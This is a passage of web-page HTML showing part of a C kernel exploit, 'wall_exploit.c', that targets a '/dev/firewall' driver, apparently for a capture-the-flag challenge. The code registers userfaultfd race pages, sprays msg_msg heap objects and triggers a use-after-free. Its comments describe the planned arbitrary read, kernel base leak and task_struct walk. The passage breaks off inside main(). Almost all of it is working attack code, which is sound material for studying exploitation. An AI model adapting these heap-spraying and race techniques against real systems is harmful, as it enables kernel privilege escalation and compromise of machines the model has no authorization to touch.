          <td id="file-wall_exploit-c-L397" class="blob-num js-line-number js-code-nav-line-number" data-line-number="397"></td>
          <td id="file-wall_exploit-c-LC397" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">register_userfault</span>(<span class="pl-c1">uint64_t</span> race_page, <span class="pl-c1">pthread_t</span> thread, <span class="pl-k">void</span> *(*func)(<span class="pl-k">void</span> *))</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L398" class="blob-num js-line-number js-code-nav-line-number" data-line-number="398"></td>
          <td id="file-wall_exploit-c-LC398" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L399" class="blob-num js-line-number js-code-nav-line-number" data-line-number="399"></td>
          <td id="file-wall_exploit-c-LC399" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> uffd, race;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L400" class="blob-num js-line-number js-code-nav-line-number" data-line-number="400"></td>
          <td id="file-wall_exploit-c-LC400" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> uffdio_api uf_api;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L401" class="blob-num js-line-number js-code-nav-line-number" data-line-number="401"></td>
          <td id="file-wall_exploit-c-LC401" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> uffdio_register uf_register;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L402" class="blob-num js-line-number js-code-nav-line-number" data-line-number="402"></td>
          <td id="file-wall_exploit-c-LC402" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L403" class="blob-num js-line-number js-code-nav-line-number" data-line-number="403"></td>
          <td id="file-wall_exploit-c-LC403" class="blob-code blob-code-inner js-file-line">    uffd = <span class="pl-bu">syscall</span>(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L404" class="blob-num js-line-number js-code-nav-line-number" data-line-number="404"></td>
          <td id="file-wall_exploit-c-LC404" class="blob-code blob-code-inner js-file-line">    uf_api.<span class="pl-smi">api</span> = UFFD_API;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L405" class="blob-num js-line-number js-code-nav-line-number" data-line-number="405"></td>
          <td id="file-wall_exploit-c-LC405" class="blob-code blob-code-inner js-file-line">    uf_api.<span class="pl-smi">features</span> = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L406" class="blob-num js-line-number js-code-nav-line-number" data-line-number="406"></td>
          <td id="file-wall_exploit-c-LC406" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L407" class="blob-num js-line-number js-code-nav-line-number" data-line-number="407"></td>
          <td id="file-wall_exploit-c-LC407" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">ioctl</span>(uffd, UFFDIO_API, (<span class="pl-k">unsigned</span> <span class="pl-k">long</span>)&amp;uf_api) == -<span class="pl-c1">1</span>)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L408" class="blob-num js-line-number js-code-nav-line-number" data-line-number="408"></td>
          <td id="file-wall_exploit-c-LC408" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L409" class="blob-num js-line-number js-code-nav-line-number" data-line-number="409"></td>
          <td id="file-wall_exploit-c-LC409" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>error with the uffdio_api<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L410" class="blob-num js-line-number js-code-nav-line-number" data-line-number="410"></td>
          <td id="file-wall_exploit-c-LC410" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L411" class="blob-num js-line-number js-code-nav-line-number" data-line-number="411"></td>
          <td id="file-wall_exploit-c-LC411" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L412" class="blob-num js-line-number js-code-nav-line-number" data-line-number="412"></td>
          <td id="file-wall_exploit-c-LC412" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L413" class="blob-num js-line-number js-code-nav-line-number" data-line-number="413"></td>
          <td id="file-wall_exploit-c-LC413" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>registering userfaultfd for 0x<span class="pl-c1">%llx</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, race_page);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L414" class="blob-num js-line-number js-code-nav-line-number" data-line-number="414"></td>
          <td id="file-wall_exploit-c-LC414" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> page for userfaultfd</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L415" class="blob-num js-line-number js-code-nav-line-number" data-line-number="415"></td>
          <td id="file-wall_exploit-c-LC415" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">mmap</span>((<span class="pl-k">void</span> *)race_page, <span class="pl-c1">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="pl-c1">0</span>, <span class="pl-c1">0</span>) != (<span class="pl-k">void</span> *)race_page)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L416" class="blob-num js-line-number js-code-nav-line-number" data-line-number="416"></td>
          <td id="file-wall_exploit-c-LC416" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L417" class="blob-num js-line-number js-code-nav-line-number" data-line-number="417"></td>
          <td id="file-wall_exploit-c-LC417" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>whoopsie doopsie on mmap<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L418" class="blob-num js-line-number js-code-nav-line-number" data-line-number="418"></td>
          <td id="file-wall_exploit-c-LC418" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L419" class="blob-num js-line-number js-code-nav-line-number" data-line-number="419"></td>
          <td id="file-wall_exploit-c-LC419" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L420" class="blob-num js-line-number js-code-nav-line-number" data-line-number="420"></td>
          <td id="file-wall_exploit-c-LC420" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L421" class="blob-num js-line-number js-code-nav-line-number" data-line-number="421"></td>
          <td id="file-wall_exploit-c-LC421" class="blob-code blob-code-inner js-file-line">    uf_register.<span class="pl-smi">range</span>.<span class="pl-smi">start</span> = race_page;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L422" class="blob-num js-line-number js-code-nav-line-number" data-line-number="422"></td>
          <td id="file-wall_exploit-c-LC422" class="blob-code blob-code-inner js-file-line">    uf_register.<span class="pl-smi">range</span>.<span class="pl-smi">len</span> = <span class="pl-c1">0x1000</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L423" class="blob-num js-line-number js-code-nav-line-number" data-line-number="423"></td>
          <td id="file-wall_exploit-c-LC423" class="blob-code blob-code-inner js-file-line">    uf_register.<span class="pl-smi">mode</span> = UFFDIO_REGISTER_MODE_MISSING;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L424" class="blob-num js-line-number js-code-nav-line-number" data-line-number="424"></td>
          <td id="file-wall_exploit-c-LC424" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L425" class="blob-num js-line-number js-code-nav-line-number" data-line-number="425"></td>
          <td id="file-wall_exploit-c-LC425" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">ioctl</span>(uffd, UFFDIO_REGISTER, (<span class="pl-k">unsigned</span> <span class="pl-k">long</span>)&amp;uf_register) == -<span class="pl-c1">1</span>)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L426" class="blob-num js-line-number js-code-nav-line-number" data-line-number="426"></td>
          <td id="file-wall_exploit-c-LC426" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L427" class="blob-num js-line-number js-code-nav-line-number" data-line-number="427"></td>
          <td id="file-wall_exploit-c-LC427" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>error registering page for userfaultfd<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L428" class="blob-num js-line-number js-code-nav-line-number" data-line-number="428"></td>
          <td id="file-wall_exploit-c-LC428" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L429" class="blob-num js-line-number js-code-nav-line-number" data-line-number="429"></td>
          <td id="file-wall_exploit-c-LC429" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L430" class="blob-num js-line-number js-code-nav-line-number" data-line-number="430"></td>
          <td id="file-wall_exploit-c-LC430" class="blob-code blob-code-inner js-file-line">    race = <span class="pl-c1">pthread_create</span>(&amp;thread, <span class="pl-c1">NULL</span>, func, (<span class="pl-k">void</span>*)(<span class="pl-k">long</span>)uffd);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L431" class="blob-num js-line-number js-code-nav-line-number" data-line-number="431"></td>
          <td id="file-wall_exploit-c-LC431" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span>(race != <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L432" class="blob-num js-line-number js-code-nav-line-number" data-line-number="432"></td>
          <td id="file-wall_exploit-c-LC432" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L433" class="blob-num js-line-number js-code-nav-line-number" data-line-number="433"></td>
          <td id="file-wall_exploit-c-LC433" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>can't setup threads for race<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L434" class="blob-num js-line-number js-code-nav-line-number" data-line-number="434"></td>
          <td id="file-wall_exploit-c-LC434" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L435" class="blob-num js-line-number js-code-nav-line-number" data-line-number="435"></td>
          <td id="file-wall_exploit-c-LC435" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L436" class="blob-num js-line-number js-code-nav-line-number" data-line-number="436"></td>
          <td id="file-wall_exploit-c-LC436" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L437" class="blob-num js-line-number js-code-nav-line-number" data-line-number="437"></td>
          <td id="file-wall_exploit-c-LC437" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L438" class="blob-num js-line-number js-code-nav-line-number" data-line-number="438"></td>
          <td id="file-wall_exploit-c-LC438" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">//</span> wait a few seconds after boot before starting exploit</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L439" class="blob-num js-line-number js-code-nav-line-number" data-line-number="439"></td>
          <td id="file-wall_exploit-c-LC439" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> <span class="pl-en">main</span>(<span class="pl-k">int</span> argc, <span class="pl-k">char</span> **argv, <span class="pl-k">char</span> **envp)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L440" class="blob-num js-line-number js-code-nav-line-number" data-line-number="440"></td>
          <td id="file-wall_exploit-c-LC440" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L441" class="blob-num js-line-number js-code-nav-line-number" data-line-number="441"></td>
          <td id="file-wall_exploit-c-LC441" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> arb read: allocate two queues, one for a kmalloc 64, another for kmalloc 64 then kmalloc 4k</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L442" class="blob-num js-line-number js-code-nav-line-number" data-line-number="442"></td>
          <td id="file-wall_exploit-c-LC442" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> the one in the back will get the extra 4k page chained to kmalloc 32 page</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L443" class="blob-num js-line-number js-code-nav-line-number" data-line-number="443"></td>
          <td id="file-wall_exploit-c-LC443" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> read the linked list to see where 4k page is, arb read it from first chunk to get its 32 page leak</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L444" class="blob-num js-line-number js-code-nav-line-number" data-line-number="444"></td>
          <td id="file-wall_exploit-c-LC444" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> then arb read that part from front msg_msg struct for kbase leak, walk task_struct same as before</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L445" class="blob-num js-line-number js-code-nav-line-number" data-line-number="445"></td>
          <td id="file-wall_exploit-c-LC445" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">sleep</span>(<span class="pl-c1">3</span>); <span class="pl-c"><span class="pl-c">//</span> i guess early on when just booted, not as stable</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L446" class="blob-num js-line-number js-code-nav-line-number" data-line-number="446"></td>
          <td id="file-wall_exploit-c-LC446" class="blob-code blob-code-inner js-file-line">    fd = <span class="pl-c1">open</span>(<span class="pl-s"><span class="pl-pds">"</span>/dev/firewalL<span class="pl-pds">"</span></span>, O_RDONLY);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L447" class="blob-num js-line-number js-code-nav-line-number" data-line-number="447"></td>
          <td id="file-wall_exploit-c-LC447" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> buffer[<span class="pl-c1">0x2000</span>], recieved[<span class="pl-c1">0x2000</span>];</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L448" class="blob-num js-line-number js-code-nav-line-number" data-line-number="448"></td>
          <td id="file-wall_exploit-c-LC448" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>(buffer, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(buffer));</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L449" class="blob-num js-line-number js-code-nav-line-number" data-line-number="449"></td>
          <td id="file-wall_exploit-c-LC449" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>(recieved, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(recieved));</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L450" class="blob-num js-line-number js-code-nav-line-number" data-line-number="450"></td>
          <td id="file-wall_exploit-c-LC450" class="blob-code blob-code-inner js-file-line">    msg *message = (msg *)buffer;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L451" class="blob-num js-line-number js-code-nav-line-number" data-line-number="451"></td>
          <td id="file-wall_exploit-c-LC451" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint64_t</span> msg_offset;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L452" class="blob-num js-line-number js-code-nav-line-number" data-line-number="452"></td>
          <td id="file-wall_exploit-c-LC452" class="blob-code blob-code-inner js-file-line">    msg_header evil;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L453" class="blob-num js-line-number js-code-nav-line-number" data-line-number="453"></td>
          <td id="file-wall_exploit-c-LC453" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint64_t</span> queue_leak;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L454" class="blob-num js-line-number js-code-nav-line-number" data-line-number="454"></td>
          <td id="file-wall_exploit-c-LC454" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint32_t</span> size;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L455" class="blob-num js-line-number js-code-nav-line-number" data-line-number="455"></td>
          <td id="file-wall_exploit-c-LC455" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L456" class="blob-num js-line-number js-code-nav-line-number" data-line-number="456"></td>
          <td id="file-wall_exploit-c-LC456" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> prepare queues</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L457" class="blob-num js-line-number js-code-nav-line-number" data-line-number="457"></td>
          <td id="file-wall_exploit-c-LC457" class="blob-code blob-code-inner js-file-line">    final_qid = <span class="pl-c1">make_queue</span>(IPC_PRIVATE, <span class="pl-c1">0666</span> | IPC_CREAT);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L458" class="blob-num js-line-number js-code-nav-line-number" data-line-number="458"></td>
          <td id="file-wall_exploit-c-LC458" class="blob-code blob-code-inner js-file-line">    front_qid = <span class="pl-c1">make_queue</span>(IPC_PRIVATE, <span class="pl-c1">0666</span> | IPC_CREAT);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L459" class="blob-num js-line-number js-code-nav-line-number" data-line-number="459"></td>
          <td id="file-wall_exploit-c-LC459" class="blob-code blob-code-inner js-file-line">    msg *finale = <span class="pl-c1">mmap</span>((<span class="pl-k">void</span> *)<span class="pl-c1">0x1337000</span>, <span class="pl-c1">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="pl-c1">0</span>, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L460" class="blob-num js-line-number js-code-nav-line-number" data-line-number="460"></td>
          <td id="file-wall_exploit-c-LC460" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> for later</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L461" class="blob-num js-line-number js-code-nav-line-number" data-line-number="461"></td>
          <td id="file-wall_exploit-c-LC461" class="blob-code blob-code-inner js-file-line">    msg *tmp = <span class="pl-c1">mmap</span>((<span class="pl-k">void</span> *)<span class="pl-c1">0xbaad000</span>, <span class="pl-c1">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="pl-c1">0</span>, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L462" class="blob-num js-line-number js-code-nav-line-number" data-line-number="462"></td>
          <td id="file-wall_exploit-c-LC462" class="blob-code blob-code-inner js-file-line">    race_page1 = <span class="pl-c1">0x1338000</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L463" class="blob-num js-line-number js-code-nav-line-number" data-line-number="463"></td>
          <td id="file-wall_exploit-c-LC463" class="blob-code blob-code-inner js-file-line">    race_page2 = <span class="pl-c1">0xbaae000</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L464" class="blob-num js-line-number js-code-nav-line-number" data-line-number="464"></td>
          <td id="file-wall_exploit-c-LC464" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">register_userfault</span>(race_page1, thread1, first_hang);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L465" class="blob-num js-line-number js-code-nav-line-number" data-line-number="465"></td>
          <td id="file-wall_exploit-c-LC465" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">register_userfault</span>(race_page2, thread1, second_hang);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L466" class="blob-num js-line-number js-code-nav-line-number" data-line-number="466"></td>
          <td id="file-wall_exploit-c-LC466" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L467" class="blob-num js-line-number js-code-nav-line-number" data-line-number="467"></td>
          <td id="file-wall_exploit-c-LC467" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> ((fd = <span class="pl-c1">open</span>(<span class="pl-s"><span class="pl-pds">"</span>/dev/firewall<span class="pl-pds">"</span></span>, O_RDONLY)) == -<span class="pl-c1">1</span>)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L468" class="blob-num js-line-number js-code-nav-line-number" data-line-number="468"></td>
          <td id="file-wall_exploit-c-LC468" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L469" class="blob-num js-line-number js-code-nav-line-number" data-line-number="469"></td>
          <td id="file-wall_exploit-c-LC469" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>driver interaction failed<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L470" class="blob-num js-line-number js-code-nav-line-number" data-line-number="470"></td>
          <td id="file-wall_exploit-c-LC470" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L471" class="blob-num js-line-number js-code-nav-line-number" data-line-number="471"></td>
          <td id="file-wall_exploit-c-LC471" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L472" class="blob-num js-line-number js-code-nav-line-number" data-line-number="472"></td>
          <td id="file-wall_exploit-c-LC472" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L473" class="blob-num js-line-number js-code-nav-line-number" data-line-number="473"></td>
          <td id="file-wall_exploit-c-LC473" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">generic_msg_spray</span>(<span class="pl-c1">0x40</span>, <span class="pl-c1">50</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L474" class="blob-num js-line-number js-code-nav-line-number" data-line-number="474"></td>
          <td id="file-wall_exploit-c-LC474" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">generic_msg_spray</span>(<span class="pl-c1">0xf00</span>, <span class="pl-c1">4</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L475" class="blob-num js-line-number js-code-nav-line-number" data-line-number="475"></td>
          <td id="file-wall_exploit-c-LC475" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L476" class="blob-num js-line-number js-code-nav-line-number" data-line-number="476"></td>
          <td id="file-wall_exploit-c-LC476" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> spray some more</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L477" class="blob-num js-line-number js-code-nav-line-number" data-line-number="477"></td>
          <td id="file-wall_exploit-c-LC477" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (<span class="pl-k">int</span> i = <span class="pl-c1">0</span>; i &lt; <span class="pl-c1">10</span>; i++)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L478" class="blob-num js-line-number js-code-nav-line-number" data-line-number="478"></td>
          <td id="file-wall_exploit-c-LC478" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L479" class="blob-num js-line-number js-code-nav-line-number" data-line-number="479"></td>
          <td id="file-wall_exploit-c-LC479" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">add</span>(fd, <span class="pl-c1">0x50</span> + i, buffer, INBOUND);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L480" class="blob-num js-line-number js-code-nav-line-number" data-line-number="480"></td>
          <td id="file-wall_exploit-c-LC480" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L481" class="blob-num js-line-number js-code-nav-line-number" data-line-number="481"></td>
          <td id="file-wall_exploit-c-LC481" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">add</span>(fd, <span class="pl-c1">0</span>, buffer, INBOUND);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L482" class="blob-num js-line-number js-code-nav-line-number" data-line-number="482"></td>
          <td id="file-wall_exploit-c-LC482" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">duplicate</span>(fd, <span class="pl-c1">0</span>, INBOUND);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L483" class="blob-num js-line-number js-code-nav-line-number" data-line-number="483"></td>
          <td id="file-wall_exploit-c-LC483" class="blob-code blob-code-inner js-file-line">    delete(fd, <span class="pl-c1">0</span>, INBOUND); <span class="pl-c"><span class="pl-c">//</span> trigger UAF</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L484" class="blob-num js-line-number js-code-nav-line-number" data-line-number="484"></td>
          <td id="file-wall_exploit-c-LC484" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L485" class="blob-num js-line-number js-code-nav-line-number" data-line-number="485"></td>
          <td id="file-wall_exploit-c-LC485" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> first step is to leak front_qid's msg_queue address from the msg_msg's linked list </span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L486" class="blob-num js-line-number js-code-nav-line-number" data-line-number="486"></td>
          <td id="file-wall_exploit-c-LC486" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> this helps for reconstruction purposes later of msg_msg structs such as when we trigger a free in msg queues</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L487" class="blob-num js-line-number js-code-nav-line-number" data-line-number="487"></td>
          <td id="file-wall_exploit-c-LC487" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> when freeing from do_msgrcv, it will try to unlink without MSG_COPY, so better to have it just loop back to queue so no crash</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L488" class="blob-num js-line-number js-code-nav-line-number" data-line-number="488"></td>
          <td id="file-wall_exploit-c-LC488" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L489" class="blob-num js-line-number js-code-nav-line-number" data-line-number="489"></td>
          <td id="file-wall_exploit-c-LC489" class="blob-code blob-code-inner js-file-line">    size = <span class="pl-c1">0x40</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L490" class="blob-num js-line-number js-code-nav-line-number" data-line-number="490"></td>
          <td id="file-wall_exploit-c-LC490" class="blob-code blob-code-inner js-file-line">    message-&gt;<span class="pl-smi">mtype</span> = <span class="pl-c1">1</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L491" class="blob-num js-line-number js-code-nav-line-number" data-line-number="491"></td>
          <td id="file-wall_exploit-c-LC491" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>(message-&gt;<span class="pl-smi">mtext</span>, <span class="pl-c1">0x41</span>, size);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L492" class="blob-num js-line-number js-code-nav-line-number" data-line-number="492"></td>
          <td id="file-wall_exploit-c-LC492" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">send_msg</span>(front_qid, message, size - <span class="pl-c1">0x30</span>, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L493" class="blob-num js-line-number js-code-nav-line-number" data-line-number="493"></td>
          <td id="file-wall_exploit-c-LC493" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L494" class="blob-num js-line-number js-code-nav-line-number" data-line-number="494"></td>
          <td id="file-wall_exploit-c-LC494" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>((<span class="pl-k">void</span> *)&amp;evil, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(msg_header));</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L495" class="blob-num js-line-number js-code-nav-line-number" data-line-number="495"></td>
          <td id="file-wall_exploit-c-LC495" class="blob-code blob-code-inner js-file-line">    evil.<span class="pl-smi">m_ts</span> = <span class="pl-c1">0xfd0</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L496" class="blob-num js-line-number js-code-nav-line-number" data-line-number="496"></td>
          <td id="file-wall_exploit-c-LC496" class="blob-code blob-code-inner js-file-line">    evil.<span class="pl-smi">m_type</span> = <span class="pl-c1">1</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L497" class="blob-num js-line-number js-code-nav-line-number" data-line-number="497"></td>
          <td id="file-wall_exploit-c-LC497" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>(buffer, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(buffer));</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L498" class="blob-num js-line-number js-code-nav-line-number" data-line-number="498"></td>
